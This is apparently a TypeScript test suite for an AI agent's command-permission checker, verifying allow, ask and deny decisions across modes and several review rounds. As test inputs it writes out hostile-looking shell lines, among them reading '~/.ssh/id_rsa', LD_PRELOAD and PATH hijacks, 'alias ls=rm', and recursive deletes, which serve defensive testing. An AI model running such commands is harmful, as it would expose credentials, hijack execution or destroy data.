    expect(await run('cd src && cat ../secret.txt', read)).toBe('ask');
    expect(await run('cd src; cat ../secret.txt', read, 'bypassPermissions')).toBe('deny');
    expect(await run('cd missing; cat secret.txt', read, 'bypassPermissions')).toBe('deny');
    expect(await run('cd -P link && cat ../x', read, 'dontAsk')).toBe('deny');
    expect(await run('builtin cd src && cat x', read, 'bypassPermissions')).toBe('deny');
    expect(await run('cd src && npm test', { allow: ['Bash(npm test *)'] })).toBe('ask');
    expect(await run('npm test', { allow: ['Bash(npm test *)'] })).toBe('allow');
    expect(parseCommandLine('cd src && ls').commands[1].understood).toBe(false);
  });

  it('matches parameter rules on the arguments the tool gets, defaults applied', async () => {
    const mailer = tool({
      name: 'mailer',
      description: 'Mail',
      parameters: z.object({ to: z.string().default('blocked@example.com') }),
      execute: async () => '',
    });
    const decision = await resolvePermission(
      mailer,
      {},
      {
        mode: 'default',
        rules: rules({ deny: ['mailer(to:blocked@example.com)'] }),
        needsApproval: false,
      }
    );
    expect(decision.decision).toBe('deny');
  });

  it.each([
    ['git branch review-new', 'deny'],
    ['git branch -d old', 'deny'],
    ['git branch -a', 'allow'],
    ['git branch --list feat*', 'deny'],
    ["git branch --list 'feat*'", 'allow'],
    ['git tag v1', 'deny'],
    ['git tag -l', 'allow'],
    ['git stash', 'deny'],
    ['git stash list', 'allow'],
    ['git worktree add x', 'deny'],
    ['git worktree list', 'allow'],
    ['git remote add x y', 'deny'],
    ['git remote -v', 'allow'],
    ['cd src && ls', 'deny'],
  ])('plan mode reads %j as %s', async (command, expected) => {
    expect(await run(command, {}, 'plan')).toBe(expected);
  });

  it.each([
    ['git status', 'deny', false],
    ['git status', 'allow', true],
    ['git diff', 'deny', true],
    ['git diff --no-ext-diff --no-textconv', 'allow', true],
    ['git show HEAD --no-ext-diff', 'deny', true],
    ['git log -p --no-ext-diff --no-textconv', 'allow', true],
    ['git log -p', 'deny', true],
    ['npm run build', 'deny', true],
    ['make', 'deny', true],
  ])(
    'plan mode runs %j as %s with a trusted repository: %s',
    async (command, expected, trusted) => {
      const decision = await resolvePermission(
        ws('run_command'),
        { command },
        {
          mode: 'plan',
          rules: rules({}),
          needsApproval: true,
          workspace,
          projectRoot: root,
          trustRepository: trusted,
        }
      );
      expect(decision.decision).toBe(expected);
    }
  );
});

describe('fourth review round', () => {
  const run = (
    command: string,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    mode: PermissionMode = 'default'
  ) =>
    resolvePermission(
      ws('run_command'),
      { command },
      { mode, rules: rules(settings), needsApproval: true, workspace, projectRoot: root }
    ).then((decision) => decision.decision);

  it('holds inline assignments to the safe list in every mode', async () => {
    expect(await run('PATH=/tmp/x ls', {}, 'plan')).toBe('deny');
    expect(await run('LD_PRELOAD=/tmp/x.so ls', { allow: ['Bash(ls *)'] })).toBe('ask');
    expect(await run('NODE_ENV=ci ls', {}, 'plan')).toBe('allow');
  });

  it('checks where cp and mv put each source', async () => {
    const protect = { deny: ['Edit(./protected/keep.txt)'], allow: ['Bash'] };
    expect(await run('cp source/keep.txt protected/', protect)).toBe('deny');
    expect(await run('cp -t protected source/keep.txt', protect)).toBe('deny');
    expect(await run('mv x/keep.txt protected', protect)).toBe('deny');
    expect(await run('cp -r source protected', protect)).toBe('deny');
    expect(await run('cp source/other.txt protected/', protect)).toBe('allow');
  });

  it('asks when a command line names more files than the rules check', async () => {
    const many = `cat ${Array.from({ length: 2500 }, (_, i) => `f${i}`).join(' ')}`;
    expect(await run(many, { deny: ['Read(./secret.txt)'], allow: ['Bash(cat *)'] })).toBe('ask');
    expect(await run(many, { deny: ['Read(./secret.txt)'] }, 'bypassPermissions')).toBe('deny');
  });

  it('checks a restricted file tool where the wrapper reads', async () => {
    const [reader] = restrictFileTools([fileRead], [root], { base: join(root, 'src') });
    const decision = await resolvePermission(
      reader,
      { path: 'app.ts' },
      {
        mode: 'default',
        rules: rules({ deny: [`Read(/${join(root, 'src', 'app.ts')})`] }),
        needsApproval: false,
      }
    );
    expect(decision.decision).toBe('deny');
  });
});

describe('sixth review round', () => {
  const decide = (
    name: string,
    args: Record<string, unknown>,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    ignoreCase?: boolean
  ) =>
    resolvePermission(ws(name), args, {
      mode: 'default',
      rules: rules(settings),
      needsApproval: true,
      workspace,
      projectRoot: root,
      ...(ignoreCase !== undefined && { ignoreCase }),
    }).then((decision) => decision.decision);

  it('compares path rules without case where the file system ignores it', async () => {
    const deny = { deny: ['Read(secret.txt)'], allow: ['Read', 'Bash'] };
    expect(await decide('read_file', { path: 'SECRET.TXT' }, deny, true)).toBe('deny');
    expect(await decide('read_file', { path: 'Secret.Txt' }, deny, true)).toBe('deny');
    expect(await decide('run_command', { command: 'cat SECRET.TXT' }, deny, true)).toBe('deny');
    expect(await decide('read_file', { path: 'SECRET.TXT' }, deny, false)).toBe('allow');
    const edits = { allow: ['Edit(src/**)'] };
    expect(await decide('write_file', { path: 'SRC/a.ts', content: '' }, edits, true)).toBe(
      'allow'
    );
    expect(await decide('write_file', { path: 'SRC/a.ts', content: '' }, edits, false)).toBe('ask');
  });

  it('probes the file system of the workspace for whether it ignores case', async () => {
    const probeRoot = join(base, 'CaseProbe');
    mkdirSync(probeRoot, { recursive: true });
    const ignores = existsSync(join(base, 'caseprobe'));
    expect(await pathsIgnoreCase(probeRoot)).toBe(ignores);
    const probed = new LocalWorkspace({ root: probeRoot });
    const decision = await resolvePermission(
      ws('read_file'),
      { path: 'SECRET.TXT' },
      {
        mode: 'default',
        rules: rules({ deny: ['Read(secret.txt)'], allow: ['Read'] }),
        needsApproval: true,
        workspace: probed,
        projectRoot: probeRoot,
      }
    );
    expect(decision.decision).toBe(ignores ? 'deny' : 'allow');
  });

  it('compares names in one Unicode form', async () => {
    const deny = { deny: ['Read(caf\u00e9.txt)'], allow: ['Read'] };
    expect(await decide('read_file', { path: 'cafe\u0301.txt' }, deny, false)).toBe('deny');
    expect(pathMatches(compiled('cafe\u0301/**'), '/x/caf\u00e9/a')).toBe('self');
  });
});

function compiled(specifier: string) {
  const pattern = compilePathPattern(specifier, 'deny', {
    cwd: '/x',
    source: '/x',
  });
  if ('error' in pattern) throw new Error(pattern.error);
  return pattern;
}

describe('seventh review round', () => {
  const run = (
    command: string,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    mode: PermissionMode = 'default'
  ) =>
    resolvePermission(
      ws('run_command'),
      { command },
      { mode, rules: rules(settings), needsApproval: true, workspace, projectRoot: root }
    ).then((decision) => decision.decision);
  const reads = { deny: ['Read(./src/lib/secret.ts)', 'Read(./notes.txt)'], allow: ['Bash'] };
  const edits = { deny: ['Edit(./src/lib/keep.ts)'], allow: ['Bash'] };

  it.each([
    ['grep -r -e token', 'deny'],
    ['grep -r -m 5 token', 'deny'],
    ['grep -rn token src', 'deny'],
    ['grep -R --include=*.ts token src', 'deny'],
    ['grep -d recurse token src', 'deny'],
    ['grep token app.txt', 'allow'],
    ['rg -t ts token', 'deny'],
    ['rg -g "*.md" token docs', 'allow'],
    ['rg --files src', 'deny'],
    ['ag token src', 'deny'],
    ['find -name x', 'deny'],
    ['find src -type f', 'deny'],
    ['find docs -name x', 'allow'],
    ['du -sh', 'deny'],
    ['du -d 1 docs', 'allow'],
    ['ls -R src', 'deny'],
    ['ls src', 'allow'],
    ['tar czf out.tgz src', 'deny'],
    ['tar -C src -cf out.tar .', 'deny'],
    ['zip -r out.zip src', 'deny'],
    ['cp -r src out', 'deny'],
    ['rsync -a src/ backup/', 'deny'],
    ['diff -r src other', 'deny'],
    ['grep -r --frobnicate token docs', 'deny'],
  ])('a Read deny inside the subtree of %j: %s', async (command, expected) => {
    expect(await run(command, reads)).toBe(expected);
  });

  it.each([
    ['rm -rf src', 'deny'],
    ['rm -r -f src/lib', 'deny'],
    ['rm src/app.ts', 'allow'],
    ['rmdir src/lib', 'deny'],
    ['chmod -R 755 src', 'deny'],
    ['chmod 755 src', 'allow'],
    ['chown -R me src', 'deny'],
    ['chgrp -R staff src', 'deny'],
    ['find src -delete', 'deny'],
    ['cp -r docs src', 'deny'],
    ['mv src elsewhere', 'deny'],
    ['tar -xzf a.tgz -C src', 'deny'],
    ['tar xzf a.tgz', 'deny'],
    ['unzip a.zip -d src', 'deny'],
    ['rsync -a docs/ src/', 'deny'],
    ['rm -rf docs', 'allow'],
  ])('an Edit deny inside the subtree of %j: %s', async (command, expected) => {
    expect(await run(command, edits)).toBe(expected);
  });

  it('does not understand a recursive command with an option it does not know', async () => {
    const grepOnly = { allow: ['Bash(grep *)', 'Bash(rm *)'] };
    expect(await run('grep -r token docs', grepOnly)).toBe('allow');
    expect(await run('grep -r --frobnicate token docs', grepOnly)).toBe('ask');
    expect(await run('rm -r --frobnicate docs', grepOnly)).toBe('ask');
    expect(parseCommandLine('rg --pre=./x token').commands[0].understood).toBe(false);
  });

  it('refuses a recursive delete or listing of a directory a path rule covers inside', async () => {
    const decide = (target: Tool, args: Record<string, unknown>, deny: string) =>
      resolvePermission(target, args, {
        mode: 'default',
        rules: rules({ deny: [deny], allow: ['Edit', 'Read'] }),
        needsApproval: false,
        workspace,
        projectRoot: root,
      }).then((decision) => decision.decision);
    const src = join(root, 'src');
    expect(await decide(fileDelete, { path: src, recursive: true }, 'Edit(./src/app.ts)')).toBe(
      'deny'
    );
    expect(await decide(fileDelete, { path: src }, 'Edit(./src/app.ts)')).toBe('allow');
    expect(await decide(fileList, { path: src, recursive: true }, 'Read(./src/app.ts)')).toBe(
      'deny'
    );
    expect(await decide(fileList, { path: src }, 'Read(./src/app.ts)')).toBe('allow');
  });
});

describe('eighth review round', () => {
  const run = (
    command: string,
    settings: Omit<PermissionLayerSettings, 'layer'>,
    mode: PermissionMode = 'default'
  ) =>
    resolvePermission(
      ws('run_command'),
      { command },
      { mode, rules: rules(settings), needsApproval: true, workspace, projectRoot: root }
    ).then((decision) => decision.decision);

  it.each([
    ['printf -v PATH ./bin; ls', 'deny'],
    ['printf "%s" x', 'allow'],
    ['date', 'allow'],
    ['date +%Y-%m-%d', 'allow'],
    ['date -u +%s', 'allow'],
    ['date --iso-8601=seconds', 'allow'],
    ['date 102410102026', 'deny'],
    ['date -s 2026-01-01', 'deny'],
    ['date -d tomorrow', 'deny'],
    ['date +%Y +%m', 'deny'],
    ['export PATH=./bin; ls', 'deny'],
    ['ls; set -e', 'deny'],
  ])('plan mode reads %j as %s', async (command, expected) => {
    expect(await run(command, {}, 'plan')).toBe(expected);
  });

  it.each([
    'printf -v PATH ./bin; ls',
    'export PATH=./bin; ls',
    'PATH=./bin; ls',
    'alias ls=rm; ls',
    'ls && umask 000',
    'builtin cd src && ls',
    'read x; ls',
  ])('a line that changes the shell state is not understood: %j', async (command) => {
    expect(parseCommandLine(command).certain).toBe(false);
    const each = ['ls', 'printf', 'export', 'alias', 'umask', 'read', 'cd', 'builtin'];
    expect(await run(command, { allow: each.map((name) => `Bash(${name} *)`) })).toBe('ask');
  });

  it('keeps a lone builtin and plain lines understood', () => {
    expect(parseCommandLine('cd src').certain).toBe(true);
    expect(parseCommandLine('ls && pwd').certain).toBe(true);
  });
});

describe('ninth review round', () => {
  it.each([
    ['grep -r TOKEN .', 'ask'],
    ['rg TOKEN', 'ask'],
    ['find . -name x', 'ask'],
    ['grep TOKEN notes.txt', 'allow'],
  ])('a shell read over a subtree an ask rule covers inside: %j %s', async (command, expected) => {
    const decision = await resolvePermission(
      ws('run_command'),
      { command },
      {
        mode: 'default',
        rules: rules({ ask: ['Read(./src/lib/secret.ts)'], allow: ['Bash'] }),
        needsApproval: true,
        workspace,
        projectRoot: root,
      }
    );
    expect(decision.decision).toBe(expected);
  });
});

describe('twelfth review round', () => {
  const run = (command: string, settings: Omit<PermissionLayerSettings, 'layer'>) =>
    resolvePermission(
      ws('run_command'),
      { command },
      { mode: 'default', rules: rules(settings), needsApproval: true, workspace, projectRoot: root }
    ).then((decision) => decision.decision);

  it('reads ~ and ~/ as the home directory, and does not understand ~user', async () => {
    const home = homedir();
    expect(parseCommandLine('cat ~/.ssh/id_rsa').commands[0].argv[1]).toBe(`${home}/.ssh/id_rsa`);
    expect(parseCommandLine('ls ~').commands[0].argv[1]).toBe(home);
    expect(parseCommandLine('PATH=~/bin:~/x ls').commands[0].understood).toBe(true);
    expect(parseCommandLine("cat '~/x'").commands[0].argv[1]).toBe('~/x');
    expect(parseCommandLine('cat a~/x').commands[0].argv[1]).toBe('a~/x');
    expect(parseCommandLine('cat ~root/x').certain).toBe(false);
    expect(parseCommandLine('cat ~+/x').certain).toBe(false);
    expect(parseCommandLine('cat ~/x', { home: '/h' }).commands[0].argv[1]).toBe('/h/x');
    const ssh = { deny: ['Read(~/.ssh/**)'], allow: ['Bash'] };
    expect(await run('cat ~/.ssh/id_rsa', ssh)).toBe('deny');
    expect(await run('cat ~root/.ssh/id_rsa', ssh)).toBe('ask');
    expect(await run('cat ~/.ssh/id_rsa', { deny: ['Bash(cat ~/.ssh/*)'], allow: ['Bash'] })).toBe(
      'deny'
    );
  });

  it.each([
    'nice env PATH=/tmp/evil git status',
    'env nice PATH=/tmp/evil git status',
    'timeout 5 env PATH=/tmp/evil git status',
    'nice timeout 5 env PATH=/tmp/evil git status',
    'env PATH=/tmp/evil nice git status',
    'time env PATH=/tmp/evil git status',
  ])('finds the assignments of %j whatever the order of its wrappers', async (command) => {
    const wrappers = ['nice', 'env', 'timeout', 'time', 'git'].map((name) => `Bash(${name} *)`);
    expect(await run(command, { allow: wrappers })).toBe('ask');
  });

  it('allows wrappers around safe assignments as before', async () => {
    expect(await run('nice env CI=1 git status', { allow: ['Bash(git status)'] })).toBe('allow');
    expect(await run('git status', { allow: ['Bash(git status)'] })).toBe('allow');
  });
});
